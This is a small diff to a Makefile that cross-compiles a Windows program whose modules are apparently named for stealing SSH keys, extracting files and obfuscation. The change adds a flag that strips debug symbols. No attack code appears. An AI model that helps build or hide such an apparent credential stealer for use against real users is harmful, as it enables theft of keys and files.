@@ -7,7 +7,7 @@ OBJ_DIR = obj/
 OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o 
 
 CC=x86_64-w64-mingw32-gcc
-CFLAGS=-g -fPIE -O2 -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
+CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
     -Wpointer-arith -Wcast-qual -Wcast-align=strict -I$(INCLUDE_DIR)
 
 #not needed for now
